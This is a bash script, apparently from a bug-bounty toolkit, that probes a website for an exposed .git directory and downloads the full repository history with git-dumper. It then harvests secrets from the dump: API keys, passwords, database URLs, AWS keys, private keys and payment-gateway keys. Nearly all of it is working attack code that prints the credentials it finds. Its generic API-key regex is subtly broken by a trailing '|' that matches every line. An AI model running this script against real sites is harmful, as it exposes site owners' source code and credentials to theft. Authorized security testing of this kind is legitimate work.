#!/usr/bin/env bash
# hunt-git-dumper.sh — git-dumper + trufflehog secret chain
#
# 流程：
#   1. GET $TARGET/.git/HEAD → 確認暴露（ref: 或 40-char hash）
#   2. git-dumper 下載完整 .git（含 objects、logs、所有 commit history）
#   3. trufflehog filesystem 掃已 dump 的目錄（--only-verified）
#   4. grep 補掃：API key / password / DB URL / AWS creds / private key
#
# 前提：hunt-git-exposure.sh 命中後再跑此 hunter（確保 .git 已暴露）
# 不同點：hunt-git-deep.sh 用 zlib 純 HTTP；本 hunter 依賴 git-dumper 完整 dump
#
# Usage:
#   ./hunt-git-dumper.sh https://target.com
#   OUT_DIR=/tmp/bb-dump ./hunt-git-dumper.sh https://target.com

set -uo pipefail

TARGET="${1:-}"
[ -z "$TARGET" ] && { echo "Usage: $0 <https://target>"; exit 1; }
TARGET="${TARGET%/}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../configs/tool-profiles.sh" 2>/dev/null || true

SLUG=$(echo "$TARGET" | sed 's|https\?://||;s|[/:]|_|g')
OUT_DIR="${OUT_DIR:-./git_dumper_out}"
DUMP_DIR="$OUT_DIR/${SLUG}_dump"
mkdir -p "$OUT_DIR" "$DUMP_DIR"
OUT="$OUT_DIR/${SLUG}.txt"
: > "$OUT"

log(){ echo "[$(date +%H:%M:%S)] $*" | tee -a "$OUT"; }
hit(){ echo "🔴 $*" | tee -a "$OUT"; }
warn(){ echo "🟡 $*" | tee -a "$OUT"; }

log "=== hunt-git-dumper: $TARGET ==="

# ── Step 1: Probe .git/HEAD (GET only, confirm exposure) ──────────
HEAD_URL="${TARGET}/.git/HEAD"
HEAD_BODY=$(curl -sk -A "$CURL_UA" --max-time 8 "$HEAD_URL" 2>/dev/null)
HEAD_CODE=$(curl -sk -A "$CURL_UA" -o /dev/null -w "%{http_code}" --max-time 8 "$HEAD_URL" 2>/dev/null)

if [[ "$HEAD_CODE" != "200" ]]; then
  log "  .git/HEAD not accessible (HTTP $HEAD_CODE) — abort"
  exit 0
fi

# Must contain a valid git HEAD (ref pointer or bare hash)
if ! echo "$HEAD_BODY" | grep -qE "^ref: refs/|^[0-9a-f]{40}$"; then
  log "  .git/HEAD response does not look like git HEAD content — abort"
  log "  response: $(echo "$HEAD_BODY" | head -c 80)"
  exit 0
fi

hit ".git exposed: $HEAD_URL → $(echo "$HEAD_BODY" | tr -d '\r\n' | head -c 60)"

# ── Step 2: Check git-dumper availability ─────────────────────────
GIT_DUMPER=""
if command -v git-dumper >/dev/null 2>&1; then
  GIT_DUMPER="git-dumper"
elif python3 -c "import git_dumper" >/dev/null 2>&1; then
  GIT_DUMPER="python3 -m git_dumper"
fi

if [ -z "$GIT_DUMPER" ]; then
  warn "git-dumper not found — skipping dump (install: pip install git-dumper)"
  warn "  manual: git-dumper $TARGET/.git/ $DUMP_DIR/"
  log "=== done (no dump tool available) → $OUT ==="
  exit 0
fi

# ── Step 3: Run git-dumper ────────────────────────────────────────
log "  running $GIT_DUMPER → $DUMP_DIR/"
if ! $GIT_DUMPER "$TARGET/.git/" "$DUMP_DIR/" >/dev/null 2>&1; then
  warn "git-dumper exited non-zero (partial dump may still be usable)"
fi

# Sanity check — something was actually downloaded
DUMP_FILE_COUNT=$(find "$DUMP_DIR" -type f 2>/dev/null | wc -l | tr -d ' ')
if [ "$DUMP_FILE_COUNT" = "0" ]; then
  warn "dump dir is empty — git-dumper may have failed silently"
  log "=== done (empty dump) → $OUT ==="
  exit 0
fi
log "  dumped $DUMP_FILE_COUNT files → $DUMP_DIR/"

# ── Step 4: trufflehog filesystem scan ───────────────────────────
TFH="$(command -v trufflehog 2>/dev/null || echo '')"
if [ -n "$TFH" ]; then
  log "  trufflehog filesystem scan (--only-verified)..."
  TFH_OUT="$OUT_DIR/${SLUG}_trufflehog.json"
  "$TFH" filesystem "$DUMP_DIR/" --json --only-verified --no-update 2>/dev/null > "$TFH_OUT" || true

  if [ -s "$TFH_OUT" ]; then
    python3 -c "
import json, sys

with open('$TFH_OUT') as f:
    for line in f:
        line = line.strip()
        if not line:
            continue
        try:
            h = json.loads(line)
            det   = h.get('DetectorName', h.get('detector_name', 'unknown'))
            raw   = str(h.get('Raw', h.get('raw', '')))[:80]
            src   = h.get('SourceMetadata', {})
            loc   = str(src.get('Data', {}).get('Filesystem', {}).get('file', str(src)))[:80]
            print(f'  🔴 [TRUFFLEHOG VERIFIED] {det}: {raw}  ({loc})')
        except json.JSONDecodeError:
            pass
" 2>/dev/null | tee -a "$OUT" || true
  else
    log "  trufflehog: no verified secrets found"
  fi
else
  warn "trufflehog not found — skipping (install: brew install trufflehog)"
fi

# ── Step 5: grep scan for common secrets ─────────────────────────
log "  grep scan for secrets in dumped files..."

# File types most likely to contain creds
INTERESTING_FILES=$(find "$DUMP_DIR" -type f \
  \( -name "*.env" -o -name "*.env.*" -o -name ".env" \
     -o -name "*.php" -o -name "*.yml" -o -name "*.yaml" \
     -o -name "*.json" -o -name "*.js" -o -name "*.ts" \
     -o -name "*.conf" -o -name "*.cfg" -o -name "*.ini" \
     -o -name "*.xml" -o -name "*.properties" -o -name "*.toml" \
     -o -name "config*" -o -name "*config*" -o -name "*settings*" \
     -o -name "*secret*" -o -name "*credential*" -o -name "*password*" \
  \) 2>/dev/null)

if [ -z "$INTERESTING_FILES" ]; then
  # Fall back to scanning everything (avoid binaries)
  INTERESTING_FILES=$(find "$DUMP_DIR" -type f -size -500k 2>/dev/null)
fi

GREP_HITS=0
while IFS= read -r F; do
  [ -f "$F" ] || continue
  # Skip binary files
  file "$F" 2>/dev/null | grep -qE "text|JSON|script|empty" || continue
  REL="${F#$DUMP_DIR/}"

  # API keys (generic)
  MATCH=$(grep -EniH \
    'api[_-]?key\s*[=:]\s*["\047]?[A-Za-z0-9/+._-]{16,}|' \
    "$F" 2>/dev/null | head -3)
  if [ -n "$MATCH" ]; then
    warn "[API_KEY] $REL"
    echo "$MATCH" | sed 's/^/    /' | tee -a "$OUT"
    GREP_HITS=$((GREP_HITS+1))
  fi

  # Passwords / secrets / tokens
  MATCH=$(grep -EniH \
    '(password|passwd|pwd|secret|token)\s*[=:]\s*["\047]?[^"\047\s]{6,}' \
    "$F" 2>/dev/null | grep -viE "^.*:\s*(#|//|--|password_confirmation|changeme|your_|example|<|{|%|test|placeholder|xxx|null|none|false|true)" | head -3)
  if [ -n "$MATCH" ]; then
    warn "[PASSWORD/SECRET] $REL"
    echo "$MATCH" | sed 's/^/    /' | tee -a "$OUT"
    GREP_HITS=$((GREP_HITS+1))
  fi

  # Database URLs (mysql/postgres/mongodb/redis)
  MATCH=$(grep -EniH \
    '(mysql|postgres|postgresql|mongodb|redis|mssql|mariadb|jdbc)://[^[:space:]"'"'"'<>{},;]{8,}' \
    "$F" 2>/dev/null | head -3)
  if [ -n "$MATCH" ]; then
    hit "[DB_URL] $REL"
    echo "$MATCH" | sed 's/^/    /' | tee -a "$OUT"
    GREP_HITS=$((GREP_HITS+1))
  fi

  # AWS credentials
  MATCH=$(grep -EniH \
    'AKIA[0-9A-Z]{16}|aws[_-]?(access[_-]?key|secret|session[_-]?token)\s*[=:]\s*["\047]?[A-Za-z0-9/+=]{16,}' \
    "$F" 2>/dev/null | head -3)
  if [ -n "$MATCH" ]; then
    hit "[AWS_CREDS] $REL"
    echo "$MATCH" | sed 's/^/    /' | tee -a "$OUT"
    GREP_HITS=$((GREP_HITS+1))
  fi

  # Private keys (PEM headers)
  MATCH=$(grep -EniH \
    '-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----' \
    "$F" 2>/dev/null | head -3)
  if [ -n "$MATCH" ]; then
    hit "[PRIVATE_KEY] $REL"
    echo "$MATCH" | sed 's/^/    /' | tee -a "$OUT"
    GREP_HITS=$((GREP_HITS+1))
  fi

  # Payment / merchant secrets (ECPay / NewebPay / TapPay / HashKey pattern)
  MATCH=$(grep -EniH \
    'HashKey\s*[=:]\s*[A-Za-z0-9]{16,}|HashIV\s*[=:]\s*[A-Za-z0-9]{16,}|MerchantID\s*[=:]|tappay[_-]?partner[_-]?key|stripe[_-]?secret|sk_live_[A-Za-z0-9]{24,}' \
    "$F" 2>/dev/null | head -3)
  if [ -n "$MATCH" ]; then
    hit "[PAYMENT_CREDS] $REL"
    echo "$MATCH" | sed 's/^/    /' | tee -a "$OUT"
    GREP_HITS=$((GREP_HITS+1))
  fi

done <<< "$INTERESTING_FILES"

if [ "$GREP_HITS" = "0" ]; then
  log "  grep: no obvious secrets found"
else
  log "  grep: $GREP_HITS potential secret patterns across dumped files"
fi

# ── Step 6: git log scan if .git is reconstructed ────────────────
if [ -d "$DUMP_DIR/.git" ]; then
  log "  scanning git log for credential changes..."
  GIT_LOG_HITS=$(git -C "$DUMP_DIR" log -p --all 2>/dev/null \
    | grep -iE "password\s*=|api[_-]?key\s*=|secret\s*=|AKIA[0-9A-Z]{16}" \
    | grep -v "^--$" | head -20)
  if [ -n "$GIT_LOG_HITS" ]; then
    hit "[GIT_LOG] credentials in commit history:"
    echo "$GIT_LOG_HITS" | sed 's/^/    /' | tee -a "$OUT"
  else
    log "  git log: no credential patterns in diff output"
  fi
fi

log "=== done → $OUT (dump: $DUMP_DIR/) ==="
